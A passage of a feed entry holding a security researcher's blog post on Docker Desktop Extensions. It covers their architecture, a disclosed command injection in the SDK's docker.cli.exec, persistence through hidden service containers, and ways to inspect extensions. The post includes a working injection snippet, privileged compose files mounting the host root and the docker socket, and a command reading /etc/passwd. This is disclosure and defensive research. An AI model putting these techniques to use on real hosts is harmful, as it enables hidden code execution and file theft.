get hold of these files depending on if an extension has been installed or not.</p>\n\n\n\n<h3 class=\"wp-block-heading\" id=\"investigatingextensionsbeforeinstalling\">investigating extensions before installing</h3>\n\n\n\n<p>This is the one method of investigation that does not involve you actually installing the extension with Docker Desktop. When browsing the marketplace, you will see references to the DockerHub repo where the extension is hosted. For example, looking at the PGAdmin GUI, we can see the repo is <code>mochoa/pgadmin4-docker-extension</code>:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-104.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"195\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-104-1024x195.png\" alt=\"\" class=\"wp-image-66378\"></a></figure>\n\n\n\n<p>This means the extensions repo is: <a rel=\"noreferrer noopener\" href=\"https://hub.docker.com/r/mochoa/pgadmin4-docker-extension\" target=\"_blank\">https://hub.docker.com/r/mochoa/pgadmin4-docker-extension</a>. Looking at the DockerHub page, we can see we can pull the container with <code>docker pull mochoa/pgadmin4-docker-extension:7.1.0</code> (specifying the version number for the container as it does not seem to have a <code>latest</code> tag). We can run the extension container as is with the <code>docker run --rm -it mochoa/pgadmin4-docker-extension:7.1.0 sh</code> command, specifying that we want an <code>sh</code> shell in the container. We&#x2019;re mostly banking on the fact that we&#x2019;re not exposing ports and or mounting any folders into the container as a form of safety for us to explore the internals.</p>\n\n\n\n<p>Once you have a shell in the container, there is a lot of information about the extension available to check, which includes the extensions&#x2019; <code>metadata.json</code>, the <code>docker-compose.yml</code> and the <code>ui</code> folder. These are all included as a result of the build phase of an extension.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-105.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"149\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-105-1024x149.png\" alt=\"\" class=\"wp-image-66379\"></a></figure>\n\n\n\n<p>If the extension ships binaries, the <code>metadata.json</code> file will reveal their locations which you would be able to access here as well.</p>\n\n\n\n<h3 class=\"wp-block-heading\" id=\"investigatingextensionsafterinstalling\">investigating extensions after installing</h3>\n\n\n\n<p>If an extension is already installed, well, you will have most of the artefacts you need on-disk already. To know which extensions are installed, run the <code>docker extension ls</code> command. This command will also give you an overview of the components the extension consists of, which include a UI, service VM and host binaries.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>$ docker extension ls\nID                           PROVIDER            VERSION             UI                  VM                  HOST\ndocker-test-extension                                                -                   Running(1)          1 binarie(s)\ntailscale/docker-extension   Tailscale Inc.      1.0.0               1 tab(Tailscale)    Running(1)          1 binarie(s)</code></pre>\n\n\n\n<p>On the host operating system, depending on the OS itself, installed extension artefacts will be available in:</p>\n\n\n\n<ul>\n<li>macOS: <code>~/Library/Containers/com.docker.docker/Data/extensions/</code></li>\n\n\n\n<li>Windows: <code>%userprofile%/AppData/Local/Docker/</code></li>\n\n\n\n<li>Linux: <code>~/.docker/desktop/</code></li>\n</ul>\n\n\n\n<p>Each extension will be contained in its own folder, but apart from the service VM itself, everything you need to get an idea of what an extension may be doing will be available in these directories. For example, taking a look at the <a rel=\"noreferrer noopener\" href=\"https://hub.docker.com/r/tailscale/docker-extension\" target=\"_blank\">Tailscale</a> extension on a macOS host:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-106.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"831\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-106-1024x831.png\" alt=\"\" class=\"wp-image-66384\"></a></figure>\n\n\n\n<p>Having an idea of the file artefacts on the host (metadata, docker-compose, ui etc.) is interesting, but you may also want to have a look at the service VM itself too. This is a little more tricky. Remember that the service VM&#x2019;s (aka: containers) don&#x2019;t show up in <code>docker ps</code>? Well, you need to get a shell in the Docker Desktop VM first, then enter the namespace for the extension service to get access to that &#x201C;container&#x201D;. Imagining you have the Tailscale extension installed, you would do something like this.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-114.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"371\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-114-1024x371.png\" alt=\"\" class=\"wp-image-66395\"></a></figure>\n\n\n\n<p>Spawn a container with <code>--pid=host</code> such that you enter the docker-desktop VM&#x2019;s host namespace with the container. I&#x2019;m using a simple debian container here, running <code>bash</code>.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>docker run -it --privileged --pid=host debian bash</code></pre>\n\n\n\n<p>Next, list the namespaces that are running / available on the host with <code>lsns</code>. I&#x2019;m filtering the output columns here as well as filtering the type to be <code>pid</code> only so that I can only see command running in a pid namespace.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>lsns -t pid -o ns,pid,command</code></pre>\n\n\n\n<p>Knowing the PID of a target program, we can <code>nsenter</code> into the namespace where that program is running.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>nsenter -t 2474 -a</code></pre>\n\n\n\n<p>This should drop you into a shell environment in the context of the Docker Desktop Extension. I realise you wont always obviously know what software is running in the container, so you may need to know a better to find the target namespace, or trial and error a bit :)</p>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"conclusion\">conclusion</h2>\n\n\n\n<p>In summary, while extensions provide an easy way to add powerful capability to Docker Desktop, they have a surprisingly complex architecture and by extension are excellent candidates for persistence and arbitrary code execution. I think a lot of work still needs to be done to help people understand what extensions are capable of, along with better ways to make it obvious in the Marketplace what extensions are going to try and do. A bit like the permissions overview you see in mobile app stores so that you can choose if you want this or not. As for the command injection, I am undecided on the risks given the overall architecture of extensions. I guess only time will tell where this will go.</p>\n",
      "content:encodedSnippet": "For our annual internal hacker conference dubbed SenseCon in 2023, I decided to take a quick look at Docker Desktop Extensions. Almost exactly a year after being announced, I wondered what the risks of a malicious docker extension could be. This is a writeup of what I learned, a few tricks I used to get some answers and how I found a “non-issue” command injection in the extensions SDK. Everything in this post was tested on macOS and Docker Desktop 4.19.0 (106363).\ntl;dr – Be extra careful with Docker Desktop Extensions given that it is significantly easier for a malicious extension to run commands, access files and more when compared to a traditional container.\nA summary of interesting things I discovered include:\nExtensions can execute arbitrary operating system commands, even if there isn’t a specific binary shipped with the extension. This is a confirmed bug and will be fixed later.\nRunning extension service “VM’s” (aka: service containers) don’t show up in docker ps. You have to run docker extension ls to see those. This could be a fun persistence technique where malicious code could hide in the extensions service VM, away from endpoint security products’ prying eyes.\nService “VM’s” being the long running components of an extension which run as a container can have more privileges than you would be comfortable to give by adding extra port/volume/privilege labels to the extensions docker-compose.yml file. Bonus points for the fact that most enterprise endpoint security solutions probably wont be able to inspect the docker virtual machine either… ;)\nUnless an extension author makes their extension open source, the only way to see what it is really doing is to manually inspect / reverse engineer the extension itself. There is no UI to give you an idea of what could be happening, which binaries were included in the extension or otherwise give you an overview of what the extension could do. The most interesting warning is the docs, and a warning when you install extensions via the CLI.\nExtensions don’t have to live on the extension Marketplace to be installable. Any well-formed container can be installed as an extension with the docker extension install command.\nAs this is a large post, here is a table of contents to help navigate it.\nintroduction\nextension architecture\nextension -> backend communication\nextension security contexts\non service “VM’s”\nthe extension-api-client sdk\n(host|vm).cli.exec\ndebugging docker desktop extensions\nrunning host binaries\narbitrary command execution in docker.cli.exec()\ngetting the extension-api-client sdk source code\nanalysing the sdk and finding the “bug”\ncommand execution risks in context\ndocker extensions for persistence\ndocker desktop extensions and the extension market place\ninvestigating docker desktop extensions\ninvestigating extensions before installing\ninvestigating extensions after installing\nconclusion\nintroduction\nLike most things, I need to do a bit of an introduction on Docker Desktop Extensions to set the groundwork for the rest of the post. There is a surprising amount of moving parts to extensions. I am going to assume you have a basic familiarity with container runtimes like docker and have an idea how Docker Desktop works with the Virtual Machine driving the container runtime and the Electron-based GUI itself.\nAs one does, I skipped reading all of the documentation and dove straight into the quick start guide. My first shock came when I ran the docker extension init command as suggested.\n\n\n\n\nYeah, you are reading that right. A Go “backend” and a React UI resulting in 165MB worth of $stuff…\n$ du -sh\n165M\t.\nI pushed on through the guide in disbelief to see what the result would look like by building the extension and installing it as per the document. The result? A new entry in the “Extensions” section creatively called “My Extension” that when clicked, showed a user interface with a button and a text box for output.\n\n\n\n\nThis button-pushing-inspecting-the-output flow was the general workflow I used throughout the testing of the Docker Desktop Extensions feature. For development there is a hot reload capability to reduce the time of the feedback loop using the docker extension dev ui-source docker-test-extension http://localhost:3000/ command which sets an extensions frontend to point to a local web server (which will make more sense in the next section). Using this you don’t have to go through the long docker build part before you can see an incremental change you made, but rather, they reflect almost immediately. \nextension architecture\nBased on what just happened when running the init command, I figured I needed help to know what could possibly warrant so much complexity. So on to the next document we go. More specifically, the architecture document that has an image with the high level extension architecture. \nWhile the documentation is definitely useful (who knew), after diving under the hood a little I came up with an expanded image that I think paints a clearer picture on all of the moving parts as well as how they interact with each other (according to my understanding anyways).\n\n\n\n\nFrontends are written using your typical web technologies (HTML, JavaScript and CSS). Docker generates a React UI skeleton as a suggestion when you init a new extension. Logically, frontends can reach optional extension specific backends which are really just containers (can be multiple container services too) and do this via the @docker/extension-api-client SDK (embedded within Docker Desktop; more on this later). docker init also generates a Golang backend skeleton as an example (more on this later too).\nExtension frontends don’t persist anything by design; this is what backends can be used for. In fact, extension UI’s die/reload when you navigate away from them in the UI and forcefully cleanup / kill any long running tasks when needed. Extension backends (also confusingly called “VM’s”) on the other hand live for as long as the extension is installed. Backends are typically web services that can be easily invoked from the frontend via a socket-like interface that the SDK exposes.\nextension -> backend communication\nIt’s probably obvious by now, but frontends need to talk to backends. This capability is exposed via the frontend SDK that the extension must use. Under the hood things are a little more complicated though. \nAs you may know, Docker Desktop interacts with the Docker Desktop Virtual Machine via a local docker socket. The logic that handles this connection to the docker socket is part of Docker Desktop and is implemented in JavaScript as you’d expect from an Electron application. Extensions also communicate via sockets to backends, however they don’t use the docker socket. Instead, extension backends need to explicitly expose their own socket such that the frontend (via the SDK) can communicate with it. Technically you could expose a TCP socket, but the documentation suggests a unix socket / named pipe to prevent port clashes with the host operating system. Regardless of the target, Docker Desktop handles all socket communications using the same underlying library and will connect as appropriate depending on where it needs to go. For extensions, a socket hint is needed as part of the extension metadata so that it knows which backend a specific extension connects to.\nVisually, communication flows could be represented as follows (where a container service lives within the Docker Desktop VM and an extension UI lives within the Docker Desktop Dashboard:\n\n\n\n\nextension security contexts\nThe documentation is fairly clear on the security context of each component of Docker Desktop Extensions. Extensions effectively run as the same user running Docker Desktop, and have the same permissions. More specifically, while the UI runs as the same user as Docker Desktop is running as, the backend runs as a container (which could technically be seen as having less permissions itself but can be configured very permissively as you’d see later).\nExtension User Interfaces can leverage the SDK to interact with docker itself, or execute any scripts and or binaries shipped as part of the extension (aka: defined in the extensions metadata). You also have the ability to run new containers which implies that an extension can run any container to execute code, mount any filesystem path and make (and listen for) network connections (via the service container) to local networks.\nIn summary, for as long as its possible to run arbitrary containers from the UI component, docker desktop extensions will effectively be arbitrary processes running on your host with no real sandboxing / privilege separation.\non service “VM’s”\nAn extension can have one or many supporting services (confusingly called “VM’s”). These are simply docker containers that are orchestrated using a docker-compose.yaml file part of your extension’s source. The default service from the init command is fairly simple.\nservices:\n  docker-test-extension:\n    image: ${DESKTOP_PLUGIN_IMAGE}\nThat in itself is not very interesting, but nothing stops a service from having some extra fun labels like:\nservices:\n  docker-test-extension:\n    image: ${DESKTOP_PLUGIN_IMAGE}\n    privileged: true\n    volumes:\n    - /:/host_root\n    - /var/run/docker.sock:/host-docker.sock\n    ports:\n      - \"8280:8280\"\nSomething that really surprised me was that a service VM, even though it’s a container, does now show up when you run docker ps.\n$ docker ps  -a\nCONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES\nInstead, you need to run docker extension ls to see extensions, and then infer that containers are running from the VM section in the output table.\n$ docker extension ls\nID                                 PROVIDER            VERSION             UI                  VM                  HOST\ngrafana/docker-desktop-extension   Grafana Labs        0.0.2               1 tab(Grafana)      Running(2)          -\nIt was also not immediately obvious to me how one would know which legitimate sockets an extension was listening on, or, because the docker-compose.yml can have so many other properties, which ports might be open and or volumes are mounted. Not great.\nthe extension-api-client sdk\nWhen a new UI component is scaffolded using the docker extension init command, one of the libraries imported is the extension-api-client library.\nimport { createDockerDesktopClient } from '@docker/extension-api-client';\nThis is the primary library used to glue the extension to Docker Desktop and an optional backend service. A function called createDockerDesktopClient() is invoked to get a new DockerDesktopClient instance from where various API calls can be made.\nI couldn’t find the actual source code online for the library, but rather a shim that would throw an error if the .ddClient property was not available on the window object.\nexport function createDockerDesktopClient() {\n    const ddClientFromWindowObject = window\n        ?.ddClient;\n    if (!ddClientFromWindowObject) {\n        throw new Error('This version of @docker/extension-api-client is not supported by your version of Docker Desktop. Please upgrade to the latest version.');\n    }\n    return ddClientFromWindowObject;\n}\nThis is not a problem (as you will see later), and so I just decided to play with the API the DockerDesktopClient object provided for now. A simple way to do that is to just use the code completion VSCode is smart enough to setup for you to learn about it.\n\n\n\n\nThe API is not very large, but three interesting functions immediately stood out for me:\nddClient.docker.cli.exec()\nddClient.extension.host.cli.exec()\nddClient.extension.vm.cli.exec()\nI’ll be honest, the first time I saw these I had no idea what they really meant and I assumed a lot. My gut feel wasn’t too far off, and neither is yours if this is the first time you see them.\nI took the boilerplate code and started messing with the function calls used on the created DockerDesktopClient instance to instead of calling the backend service, just invoke these exec() functions and populate the output in the UI (with the hot reloading feature I mentioned earlier configured). Effectively that meant that I only had to fiddle with the already provided fetchAndDisplayResponse function, save my changes, tab back to Docker Desktop and click the “Call backend” button to see the effect. For example:\n  const fetchAndDisplayResponse = async () => {\n    const result = await ddClient.docker.cli.exec(\"ps\", []);\n    setResponse(JSON.stringify(result));\n  };\nThis function would update the extensions’ UI to show the output of the exec() function I called which supposedly (spoiler: it did) called docker ps under the hood like this:\n\n\n\n\nUp until this point, everything behaved pretty much as I expected and matched what I read in the docs.\n(host|vm).cli.exec\nThe ddClient.extension.host and ddClient.extension.vm properties, as the names imply, refer to the service VM (aka: the backend) and the host operating system. Both of them have the cli.exec() function with the same signature, but behave slightly differently.\nLet’s start with the service specific exec function, vm.cli.exec. Given the following line of code to run the ls / command:\nconst result = await ddClient.extension.vm?.cli.exec(\"ls\", [\"/\"]);\nThe resulting output in Docker Desktop would look as follows:\n\n\n\n\nThat is the output as expected. A (hard to read) list of files and folders inside of the docker container which is also the container where the backend service that the boilerplate docker init generator provided is running. Easy enough.\nTo run a command on the host, I simply ran the host variant of the same code as follows:\nconst result = await ddClient.extension.host?.cli.exec(\"ls\", [\"/\"]);\nThe difference in output though was… that there was no output. I reloaded the extension numerous times, double checked for syntax errors and more, but no dice. I had to go deeper!\ndebugging docker desktop extensions\nGiven that Docker Desktop is an electron application, it’s not strange to imagine that you can open the Chrome console/debugger attached to it. The question though is, how?\nup, up, down, down, left, right, left, right, p, d, t\nThat is how. I’m not even kidding. While a variation of the Konami Code funny the first time, it’s incredibly frustrating to deal with given how often the console window closes, forcing you to repeatedly type this sequence; every, freaking, time.\nrunning host binaries\nWith the developer console open, I could finally see some debugging output when I tried to run ls on the host.\n\n\n\n\nTurns out there were two problems. One, exceptions weren’t propagated to the UI which is why I needed the console (meh). Two, apparently my extension tried to run ls relative to the current directory. This wasn’t a problem when running ls in the container though. Okay, so let’s try running /bin/ls instead then.\nconst result = await ddClient.extension.host?.cli.exec(\"/bin/ls\", [\"/\"]);\nThe result?\n\n\n\n\nI double checked my own sanity, and confirmed that /bin/ls really is where I thought it would be, but instead, the response when trying to execute it is a sentence specifically saying that the extension binary is not found. Does this mean extensions can’t execute arbitrary commands on the host operating system?\nI checked out the documentation once more to see what the intended flow was here, and learnt about the fact that an extension itself needs to also ship any scripts/binaries it wants to run. These binaries/scripts must be declared in the metadata.json file for each supported operating system / architecture and will be copied to the service VM (aka: backend) when building the extension. When installing the extension these will be copied to the host operating system. That means, if I wanted to have a script available to run from the frontend UI, I needed to declare a new block in my metadata.json file like this (next to the ui and vm keys) with the path where it will be in the service container:\n  \"host\": {\n    \"binaries\": [\n      {\n        \"darwin\": [{ \"path\": \"/poo.sh\" }]\n      }\n    ]\n  }\nThe Dockerfile for the extension would simply copy the executable script from a local path into the container on build with this line:\nCOPY poo.sh /poo.sh\nAfter building the extension and finally installing it with the docker extension install command, a few lines showing that binaries are installed on the host (well really just copied out of the container into an extension specific directory on the host which was ~/Library/Containers/com.docker.docker/Data/extensions/extension-name/host/ for me) should show up:\n...\n\nInstalling Desktop extension binary \"poo.sh\" on host...\nDesktop extension binary \"poo.sh\" installed\n\n...\nWith that all set up, running the host.cli.exec call with my new script should now look like this.\nconst result = await ddClient.extension.host?.cli.exec(\"poo.sh\", []);\n\n\n\n\nTo double check that the file on my host operating system really was the one the extension UI would run, I updated it from the host to print the current working directory as well, and reran it via the Docker Desktop Extension UI.\n\n\n\n\nAs expected, the output updated to include the result of the pwd command that I had added.\n\n\n\n\nGreat. So it seems like there is something preventing one from running arbitrary operating system commands using just the SDK. The question though is, what and how does that work?\narbitrary command execution in docker.cli.exec()\nAt this point I figured I knew enough about the SDK and how it was intended to be used that I started playing around a bit more. To recap, the host and VM versions of cli.exec had the same function signatures, but behaved differently in that the VM version did not sanitise paths whereas the host version did.\nI tried a few things to try and get host.cli.exec to execute a command without it being in the metadata.json file first, but none of my cheap shots were successful. This included messing with some ENV variables you can set in the exec call via an optional ExecOptions argument. In most of the cases the console session attached to the extension UI told me the binary can’t be found, or threw some exception.\nFor a moment I turned back to the ddClient.docker.cli.exec call though and notices the ps argument passed to it; just like you’d use on the command line. I tried a classic command injection in the first argument there using something like ps; pwd. That meant my code looked something like this:\nconst result = await ddClient.docker.cli.exec(\"ps; pwd\", []);\nThe result?\n\n\n\n\nArbitrary command execution using the SDK via the docker.cli.exec function!\nAt this stage I really wasn’t sure what this meant, if anything at all. Even though the host/VM exec versions clearly behave differently and it seemed like some effort was made to prevent extensions from running arbitrary operating system commands using the SDK, all of that was bypassed via the docker.cli.exec implementation. I was also mostly confused about why this injection worked in the first place, so, I started hunting for the SDK source code to learn more.\ngetting the extension-api-client sdk source code\nAs I’ve mentioned previously, the @docker/extension-api-client source code wasn’t particularly interesting as it only contained a shim to check if the ddClient object was available on the window object. With Docker Desktop being an Electron application, one can easily supply extra JavaScript libraries as part of the application’s bundle, and it seemed like Docker decided that the source code for the SDK is not something you can get on Github (at least, not where I could find it). Not to worry though, Electron applications typically have their source code bundled into an ASAR archive. There is even a handy asar utility to work with these archives provided by Electron which includes the ability to extract them.\nOn macOS, the Docker Desktop ASAR archive could be found in /Applications/Docker.app/Contents/MacOS/Docker Desktop.app/Contents/Resources. I copied the app.asar file together with the app.asar.unpacked folder to a temporary directory and extracted it there using the asar extract command. This left me with the following files and folder structure:\n? ll\nPermissions Size User    Date Modified Name\ndrwxr-xr-x     - leonjza 23 May 22:47  node_modules\n.rw-r--r--   945 leonjza 23 May 22:47  package.json\ndrwxr-xr-x     - leonjza 23 May 22:30  src_transpiled\ndrwxr-xr-x     - leonjza 23 May 22:30  web\nI did a quick check to see if what I was looking for was in any of these files with a quick grep. \n\n\n\n\nYeah, this was it for sure. More specifically, the search revealed a directory called extension-api-client-ipc which was named closely to the one I was after. That was where I started to check for hints on how this all worked.\nanalysing the sdk and finding the “bug”\nI am not going to bore you with all of the details of the SDK, but I’ll highlight a few key things to learn from the codebase. Bonus points for the fact that it looked like the TypeScript source code was available, unminified. That made for very easy reading and analysis! Heck, for the most part VSCode intellisense even worked!\nThe SDK’s src/createExtensionNode.ts file had a function called createExtensionNode which returned a object that matched the SDK API. Notice the TODO there. I think someone knew what was coming here. :D \n\n\n\n\nThe SDK made heavy use of the Electron ipcRenderer, to communicate between the extension and the main Electron thread asynchronously. For example, the host.cli.exec function would call something like ipcRenderer.postMessage('extension-spawn-cmd', ...); (a reduced example) to effectively invoke whatever is registered to listen for extension-spawn-cmd to do some work.\nIn another location (not specifically the SDK now), in src_transpiled/extensions/registerDashboardPageIpcHandlers.js, many Electron IPC handlers were registered  such as extension-spawn-cmd. These were implemented for example as electron_1.ipcMain.on('extension-spawn-cmd', ...). From here we could finally see the real functions invoked to execute commands coming in from an SDK function invoked by an extension.\n\n\n\n\nThe spawnHostCmd was probably the most important function to find.\n\n\n\n\nThis function does a path check on the cmd argument received, and if it does not exist, return the error we saw earlier when trying to run binaries with host.cli.exec. If everything checks out, execution passes to spawnCommand that simply does a child_process.spawn while gluing all of the relevant event listeners and cleanup routines together. In summary, spawnCommand takes a raw command and runs it.\nIn the same file though, there is a function called spawnDockerCmd.\n\n\n\n\nNotice how this function is simply a wrapper to spawnCommand and not spawnHostCommand? I double checked the flow from the docker.cli.exec definition for the SDK to here and it checked out. This is why a command injection in docker.cli.exec works; it’s literally just a wrapper to child_process.spawn. It makes sense too; the docker binary is not shipped with the extension but rather is available on the host so the path check in spawnHostCommand would cause it to fail.\ncommand execution risks in context\nTo be upfront, I am not sure about the risks of the command injection I found, especially in the context of what is possible with a Docker Desktop Extension by default. It could totally be a non-issue given how many different ways you could achieve the same thing with extensions.\nThe documentation as well as the docker extension install command warns you multiple times about the risks involved. However, most of the confusion for me in terms of risk is driven by the fact that some effort is made to limit what an extension can execute on the host running Docker Desktop from the UI. If you consider that backend service VM’s can mount any directory (via the docker-compose.yml file) and have any code they would want to run shipped as part of a container (including scripts that contain arbitrary commands), maybe the command injection really isn’t that interesting (or not even a bug to begin with)?\nThere is also the fact that you can run any arbitrary docker containers using the UI SDK which would effectively boil down to the same risk. For example:\nconst result = await ddClient.docker.cli\n  .exec(\"run\", [\"--rm\", \"-v\", \"/:/host_root\", \"alpine\", \"cat\", \"/etc/passwd\"]);\nWhen considering extension reviews (or otherwise investigating what an extension does which I touch on later in this post), it’s nice to have an overview of what an extension may be up to given the metadata.json file and SDK API usage (assuming no bugs) which is what I think Docker went for here. As extensions don’t have to be open source and can easily minify/obfuscate their source code, spotting malicious use of the docker.cli.exec function might be hard.\nThen there is the other problem. It’s not immediately obvious to me how a user is supposed to verify (or get an overview of) how a particular extension works other than the description on the Marketplace to determine if they trust it. The only option really is to manually investigate it (which I dive into a bit later).\nI reported this issue to the docker security team, and their response in short was that this is a non-issue, though they will try and fix the injection in a later release.\ndocker extensions for persistence\nBecause backend service VM’s are long running containers, and the fact that they don’t show up when running docker ps, I figured it would be interesting to consider how extensions could be used for persistence. More so because they effectively run with the same privileges as the user running Docker Desktop.\nBecause the UI tears down completely when navigating away from it in the Docker Desktop application, I figured it wasn’t that interesting a place to have some code running that could be useful later. Especially if you wanted to make it not so obvious. Backend service VM’s however are significantly more interesting.\nBut, wouldn’t it be cool if we could have a service VM running without it being visible in Docker Desktop? We’ll, turns out if you just omit the value defined in the metadata.json file for the ui.dashboard-tab.title key, or completely omit the parent ui key, the extension will run the service VM without a tab showing up in Docker Desktop Extensions list. It will however show up in the extensions’ “Manage” tab.\n\n\n\n\nIn contrast, when an extension with a UI is installed, it typically shows up in the Extensions list making it a little more obvious that an extension is running.\n\n\n\n\nThe next thing you may notice is how little information is shown in the manage tab of the Docker Desktop UI for my test extension. Part of the extensions requirements for service VM’s is that you need to declare various labels in your Dockerfile for the service VM. Only the com.docker.desktop.extension.api.version label was required when I built it locally, so leaving everything else blank has your extension tell a little less about itself to Docker Desktop. This may be a good or bad thing, depending on how you plan on hiding in plain sight ;). Keep in mind though that this will fail with the docker extension validate if you plan on publishing your extension on the market place.\n\n\n\n\nThe docker-compose.yml file is probably the most important part to have your service VM able to do anything interesting beyond maybe just being a tunnel into the target network where a malicious extension is installed (which is already powerful). Access to the host operating systems filesystem can be achieved with a mount point defined that makes the compose file look something like this:\nservices:\n  docker-test-extension:\n    image: ${DESKTOP_PLUGIN_IMAGE}\n    volumes:\n    - /:/host_root\nThis will have a Docker Desktop Extension service VM have access to the host operating systems file system. Inside of the service VM there could be code running that makes a connection out to a command and control server, ready to execute commands, setup proxies to an internal network and or read files of the host (to name a few); all without you really knowing that this is obviously happening. Lastly, given that Docker Desktop depends on a backend Virtual Machine to run, I’m not sure of many endpoint security products having the ability to peek inside of VM’s to spot something nefarious happening there.\nAs for a PoC, I’ll leave this as an exercise for the reader to explore a little further ;)\ndocker desktop extensions and the extension market place\nThe next part you might be wondering is how the Docker Desktop Extension marketplace helps with any of this. Docker has a guideline for how extension marketplace submissions work, along with the verification workflow here. In summary, the extension needs to meet some requirements and the review process is manual. In exchange, your extension gets a cool “Reviewed” label.\n\n\n\n\nLooking at the publishing documentation here though, you can also find a link to “Self-publish” your extension which appears to be driven by a Github Action workflow that automates extension publishing to the marketplace without human intervention. For example, this submission issue shows that in action. Doing it this way has your extension show up in the market place with a “Not reviewed label”.\n\n\n\n\nI did not try and publish a malicious extension myself, though I imagine the automated submission process of a seemingly benign extension would have at least some shelf-life. More so abusing the command injection I found.\nThat said, your extension does not have to be in the Marketplace to be installable. You can simply publish your extension container to a registry and install it with docker extension install. For example:\n\n\n\n\ninvestigating docker desktop extensions\nSo I just spoke a lot about all of the bad things an extension could potentially get up to. The more important question though should be: “How can I investigate extensions myself?”.\nYou are generally interested in two things. The frontend UI and the backend service(s). Diving into each, below is a handy guide with some tips to dig under the covers and see whats really happening depending on if you have installed the extension already, or not.\nThe basic components you should be interested in is the docker-compose.yml, the metadata.json file, the service containers themselves and finally the UI sources.\nThe metadata.json file could give you an idea of where:\nThe docker-compose.yml lives together with any unix sockets/named pipes it will expect to connect the UI.\nThe UI source code lives.\nAny host binaries are that will be copied to the OS.\nThe docker-compose.yml file should be checked as it could enable services to:\nMount host directories into the container.\nGrant the container extra privileges.\nMount in the docker socket to do all of the above.\nOpen arbitrary ports.\nThe UI source directory could be checked to see if there is:\nSuspicious usage of the Docker Desktop Extensions SDK. i.e. Is the UI spawning arbitrary containers?\nHost binary invocation and what that is? Maybe even command injections ;)\nOne issue you may run into with the UI components is that extension authors could easily minify and or otherwise obfuscate the JavaScript sources, making it difficult to analyse. In fact, of the few extensions I looked at nearly all of them at least minified their JavaScript sources. Annoying.\nFinally, the service VM containers themselves are obviously interesting. These containers could really be running anything, so I would suggest investigating them separately, inspecting their layers with tools such as dive and getting an idea of what is run inside.\nRegardless, now that you know which components of extensions are interesting, lets look at how you can get hold of these files depending on if an extension has been installed or not.\ninvestigating extensions before installing\nThis is the one method of investigation that does not involve you actually installing the extension with Docker Desktop. When browsing the marketplace, you will see references to the DockerHub repo where the extension is hosted. For example, looking at the PGAdmin GUI, we can see the repo is mochoa/pgadmin4-docker-extension:\n\n\n\n\nThis means the extensions repo is: https://hub.docker.com/r/mochoa/pgadmin4-docker-extension. Looking at the DockerHub page, we can see we can pull the container with docker pull mochoa/pgadmin4-docker-extension:7.1.0 (specifying the version number for the container as it does not seem to have a latest tag). We can run the extension container as is with the docker run --rm -it mochoa/pgadmin4-docker-extension:7.1.0 sh command, specifying that we want an sh shell in the container. We’re mostly banking on the fact that we’re not exposing ports and or mounting any folders into the container as a form of safety for us to explore the internals.\nOnce you have a shell in the container, there is a lot of information about the extension available to check, which includes the extensions’ metadata.json, the docker-compose.yml and the ui folder. These are all included as a result of the build phase of an extension.\n\n\n\n\nIf the extension ships binaries, the metadata.json file will reveal their locations which you would be able to access here as well.\ninvestigating extensions after installing\nIf an extension is already installed, well, you will have most of the artefacts you need on-disk already. To know which extensions are installed, run the docker extension ls command. This command will also give you an overview of the components the extension consists of, which include a UI, service VM and host binaries.\n$ docker extension ls\nID                           PROVIDER            VERSION             UI                  VM                  HOST\ndocker-test-extension                                                -                   Running(1)          1 binarie(s)\ntailscale/docker-extension   Tailscale Inc.      1.0.0               1 tab(Tailscale)    Running(1)          1 binarie(s)\nOn the host operating system, depending on the OS itself, installed extension artefacts will be available in:\nmacOS: ~/Library/Containers/com.docker.docker/Data/extensions/\nWindows: %userprofile%/AppData/Local/Docker/\nLinux: ~/.docker/desktop/\nEach extension will be contained in its own folder, but apart from the service VM itself, everything you need to get an idea of what an extension may be doing will be available in these directories. For example, taking a look at the Tailscale extension on a macOS host:\n\n\n\n\nHaving an idea of the file artefacts on the host (metadata, docker-compose, ui etc.) is interesting, but you may also want to have a look at the service VM itself too. This is a little more tricky. Remember that the service VM’s (aka: containers) don’t show up in docker ps? Well, you need to get a shell in the Docker Desktop VM first, then enter the namespace for the extension service to get access to that “container”. Imagining you have the Tailscale extension installed, you would do something like this.\n\n\n\n\nSpawn a container with --pid=host such that you enter the docker-desktop VM’s host namespace with the container. I’m using a simple debian container here, running bash.\ndocker run -it --privileged --pid=host debian bash\nNext, list the namespaces that are running / available on the host with lsns. I’m filtering the output columns here as well as filtering the type to be pid only so that I can only see command running in a pid namespace.\nlsns -t pid -o ns,pid,command\nKnowing the PID of a target program, we can nsenter into the namespace where that program is running.\nnsenter -t 2474 -a\nThis should drop you into a shell environment in the context of the Docker Desktop Extension. I realise you wont always obviously know what software is running in the container, so you may need to know a better to find the target namespace, or trial and error a bit :)\nconclusion\nIn summary, while extensions provide an easy way to add powerful capability to Docker Desktop, they have a surprisingly complex architecture and by extension are excellent candidates for persistence and arbitrary code execution. I think a lot of work still needs to be done to help people understand what extensions are capable of, along with better ways to make it obvious in the Marketplace what extensions are going to try and do. A bit like the permissions overview you see in mobile app stores so that you can choose if you want this or not. As for the command injection, I am undecided on the risks given the overall architecture of extensions. I guess only time will tell where this will go.",
